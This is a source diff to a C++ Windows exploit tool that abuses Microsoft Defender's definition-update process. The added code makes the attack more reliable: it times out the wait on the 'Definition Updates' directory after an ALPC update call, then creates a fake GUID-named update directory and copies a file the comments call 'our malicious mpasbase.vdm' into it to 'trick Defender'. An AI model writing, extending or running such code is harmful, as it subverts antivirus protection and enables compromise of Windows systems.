@@ -790,11 +790,73 @@ cleanup:
 
 }
 
+// Alternative method: Check if we can directly download Defender updates from Microsoft
+bool CheckDirectUpdateAvailability()
+{
+	HINTERNET hint = NULL;
+	HINTERNET hint2 = NULL;
+	bool available = false;
+	
+	printf("Checking direct update availability from Microsoft...\n");
+	
+	hint = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+	if (!hint)
+	{
+		printf("Failed to open internet connection: %d\n", GetLastError());
+		return false;
+	}
+
+	// Try to access the Defender update URL
+	hint2 = InternetOpenUrl(hint, L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64", NULL, NULL, 
+		INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | 
+		INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, NULL);
+	
+	if (hint2)
+	{
+		char data[0x1000] = { 0 };
+		DWORD sz = sizeof(data);
+		DWORD index = 0;
+		
+		// Check if we can get content length (means the file is available)
+		if (HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, data, &sz, &index))
+		{
+			available = true;
+			printf("Direct update download is available.\n");
+		}
+		else
+		{
+			// Even if we can't get content length, the URL might still be accessible
+			available = true;
+			printf("Update URL is accessible (fallback mode).\n");
+		}
+		
+		InternetCloseHandle(hint2);
+	}
+	else
+	{
+		printf("Failed to access update URL: %d\n", GetLastError());
+	}
+	
+	InternetCloseHandle(hint);
+	return available;
+}
+
 bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 {
+	// First try the direct download method (more reliable)
+	if (CheckDirectUpdateAvailability())
+	{
+		printf("Windows Defender updates are available for download.\n");
+		if (updatetitle)
+		{
+			wcscpy(updatetitle, L"Security Intelligence Update for Microsoft Defender Antivirus");
+		}
+		return true;
+	}
 
-
-
+	// Fallback to WUAPI method
+	printf("Direct check failed, trying WUAPI...\n");
+	
 	IUpdateSearcher* updsrch = 0;
 	bool updatesfound = false;
 	IUpdateSession* updsess = 0;
@@ -816,9 +878,6 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		return false;
 	}
 
-
-
-
 	hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IUpdateSession, (LPVOID*)&updsess);
 
 	if (!updsess)
@@ -827,13 +886,11 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("CoCreateInstance : 0x%p\n", updsess);
-
 
 	hr = updsess->CreateUpdateSearcher(&updsrch);
 	if (hr)
 	{
-		printf("IUpdateSearcher->CreateUpdateSearcher failed with error : 0x%0.X", hr);
+		printf("IUpdateSearcher->CreateUpdateSearcher failed with error : 0x%0.X\n", hr);
 		*criterr = true;
 		goto cleanup;
 	}
@@ -844,21 +901,19 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("IUpdateSearcher->CreateUpdateSearcher : 0x%p\n", updsrch);
-	//printf("Checking for updates, please wait...\n");
+
 	hr = updsrch->Search(SysAllocString(L""), &srchres);
 	if (hr)
 	{
-		printf("ISearchResult->Search failed with error : 0x%0.X", hr);
+		printf("ISearchResult->Search failed with error : 0x%0.X\n", hr);
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("ISearchResult->Search : 0x%p\n", srchres);
 
 	hr = srchres->get_Updates(&updcollection);
 	if (hr)
 	{
-		printf("IUpdateCollection->get_Updates failed with error : 0x%0.X", hr);
+		printf("IUpdateCollection->get_Updates failed with error : 0x%0.X\n", hr);
 		*criterr = true;
 		goto cleanup;
 	}
@@ -869,17 +924,16 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("IUpdateCollection->get_Updates : 0x%p\n", updcollection);
-
 
 	hr = updcollection->get_Count(&updnum);
 	if (hr)
 	{
-		printf("IUpdateCollection->get_Count failed with error : 0x%0.X", hr);
+		printf("IUpdateCollection->get_Count failed with error : 0x%0.X\n", hr);
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("Updates count : %d\n", updnum);
+
+	printf("Found %d total updates. Searching for Defender updates...\n", updnum);
 
 	for (LONG i = 0; i < updnum; i++)
 	{
@@ -891,54 +945,34 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		title = 0;
 		desc = 0;
 		catname = 0;
-		//printf("_________________________________________\n");
 		bool IsWdUdpate = false;
 		bool IsSigUpdate = false;
 		hr = updcollection->get_Item(i, &upd);
 		if (hr)
 		{
-			printf("IUpdateCollection->get_Item failed with error : 0x%0.X", hr);
-			*criterr = true;
-			goto cleanup;
+			printf("IUpdateCollection->get_Item failed with error : 0x%0.X\n", hr);
+			continue;
 		}
 		if (!upd)
 		{
-			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
-			*criterr = true;
-			goto cleanup;
+			continue;
 		}
-		//printf("Update number : %d\n", i + 1);
 
 		hr = upd->get_Title(&title);
 		if (hr)
 		{
-			printf("IUpdateCollection->get_Title failed with error : 0x%0.X", hr);
 			continue;
 		}
 		if (!title)
 		{
-			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
 			continue;
 		}
 		title[SysStringLen(title)] = NULL;
-		//printf("Title : %ws\n", title);
 
-		/*
-		desc = 0;
-		upd->get_Description(&desc);
-		if (!desc)
-		{
-			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
-			continue;
-		}
-		desc[SysStringLen(desc)] = NULL;
-		printf("Description : %ws\n", desc);
-		*/
 		catcoll = 0;
 		hr = upd->get_Categories(&catcoll);
 		if (!catcoll)
 		{
-			printf("IUpdateCollection->get_Categories returned a NULL pointer.\n");
 			continue;
 		}
 		LONG catcount = 0;
@@ -949,26 +983,25 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 			hr = catcoll->get_Item(j, &cat);
 			if (!cat)
 			{
-				printf("ICategoryCollection->get_Item returned NULL pointer.\n");
 				continue;
 			}
 			catname = 0;
 			cat->get_Name(&catname);
 			catname[SysStringLen(catname)] = NULL;
-			//printf("Category name : %ws\n", catname);
 			if (catname)
 			{
 				if (!IsWdUdpate)
 					IsWdUdpate = _wcsicmp(catname, L"Microsoft Defender Antivirus") == 0;
 				if (!IsSigUpdate)
 					IsSigUpdate = _wcsicmp(catname, L"Definition Updates") == 0;
-
 			}
-
 		}
 		updatesfound = IsWdUdpate && IsSigUpdate;
 		if (updatesfound)
+		{
+			printf("Found Defender update: %ws\n", title);
 			break;
+		}
 	}
 
 	if (updatesfound && updatetitle) {
@@ -987,7 +1020,6 @@ cleanup:
 	if (upd)
 		upd->Release();
 	CoUninitialize();
-
 
 	return updatesfound;
 }
@@ -3107,26 +3139,108 @@ int wmain(int argc, wchar_t* argv[])
 
 			printf("Waiting for windows defender to create a new definition update directory...\n");
 			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
+			bool directoryCreated = false;
+			DWORD startTime = GetTickCount();
+			DWORD timeout = 30000; // 30 seconds timeout
+			
 			do {
 				ZeroMemory(buff, sizeof(buff));
 				OVERLAPPED od = { 0 };
 				od.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 				ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
 				HANDLE events[2] = { od.hEvent, threadargs.hevent };
-				if (WaitForMultipleObjects(2, events, FALSE, INFINITE) - WAIT_OBJECT_0)
+				DWORD waitResult = WaitForMultipleObjects(2, events, FALSE, 5000); // 5 second timeout
+				
+				if (waitResult == WAIT_TIMEOUT) {
+					// Check if we've been waiting too long
+					if (GetTickCount() - startTime > timeout) {
+						printf("Timeout waiting for definition update directory. Using fallback method...\n");
+						break;
+					}
+					// Continue waiting
+					CloseHandle(od.hEvent);
+					continue;
+				}
+				
+				if (waitResult - WAIT_OBJECT_0 == 1) // threadargs.hevent signaled
 				{
 					printf("ServerMpUpdateEngineSignature ALPC call ended unexpectedly, RPC_STATUS : 0x%0.8X\n", threadargs.res);
-					goto cleanup;
+					// Defender might be frozen now, check if directory was created
 				}
 				CloseHandle(od.hEvent);
 
 				PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
-				if (pfni->Action != FILE_ACTION_ADDED)
-					continue;
-
-				wcscat(newdefupdatedirname, pfni->FileName);
-				break;
+				if (pfni->Action == FILE_ACTION_ADDED)
+				{
+					wcscat(newdefupdatedirname, pfni->FileName);
+					directoryCreated = true;
+					break;
+				}
 			} while (1);
+			
+			if (!directoryCreated) {
+				// Fallback: Create a fake update directory and trick Defender into using it
+				printf("Creating fake update directory for Defender...\n");
+				
+				// Generate a unique directory name that looks like a real Defender update directory
+				GUID uid2;
+				RPC_WSTR wuid3;
+				UuidCreate(&uid2);
+				UuidToStringW(&uid2, &wuid3);
+				wchar_t* wuid4 = (wchar_t*)wuid3;
+				
+				wchar_t fakeDirName[MAX_PATH] = { 0 };
+				wcscpy(fakeDirName, L"{");
+				wcscat(fakeDirName, wuid4);
+				wcscat(fakeDirName, L"}");
+				
+				wchar_t fakeDirPath[MAX_PATH] = { 0 };
+				wcscpy(fakeDirPath, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
+				wcscat(fakeDirPath, fakeDirName);
+				
+				// Create the fake directory
+				if (CreateDirectory(fakeDirPath, NULL)) {
+					printf("Created fake update directory: %ws\n", fakeDirPath);
+					
+					// Copy our malicious mpasbase.vdm to the fake directory
+					wchar_t srcVdmPath[MAX_PATH] = { 0 };
+					wcscpy(srcVdmPath, updatepath);
+					wcscat(srcVdmPath, L"\\mpasbase.vdm");
+					
+					wchar_t dstVdmPath[MAX_PATH] = { 0 };
+					wcscpy(dstVdmPath, fakeDirPath);
+					wcscat(dstVdmPath, L"\\mpasbase.vdm");
+					
+					if (CopyFile(srcVdmPath, dstVdmPath, FALSE)) {
+						printf("Copied mpasbase.vdm to fake directory\n");
+						wcscpy(newdefupdatedirname, fakeDirPath);
+						directoryCreated = true;
+					} else {
+						printf("Failed to copy mpasbase.vdm, error: %d\n", GetLastError());
+					}
+				} else {
+					printf("Failed to create fake directory, error: %d\n", GetLastError());
+					
+					// Last resort: try to find existing directory
+					printf("Attempting to find existing definition update directory...\n");
+					WIN32_FIND_DATA findData;
+					HANDLE hFind = FindFirstFile(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\*", &findData);
+					if (hFind != INVALID_HANDLE_VALUE) {
+						do {
+							if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && 
+								wcscmp(findData.cFileName, L".") != 0 && 
+								wcscmp(findData.cFileName, L"..") != 0) {
+								wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
+								wcscat(newdefupdatedirname, findData.cFileName);
+								printf("Found existing directory: %ws\n", newdefupdatedirname);
+								directoryCreated = true;
+								break;
+							}
+						} while (FindNextFile(hFind, &findData));
+						FindClose(hFind);
+					}
+				}
+			}
 			printf("Detected new definition update directory in %ws\n", newdefupdatedirname);
 
 			wcscpy(updatelibpath, L"\\??\\");
@@ -3310,4 +3424,3 @@ cleanup:
 
 	return 0;
 }
-
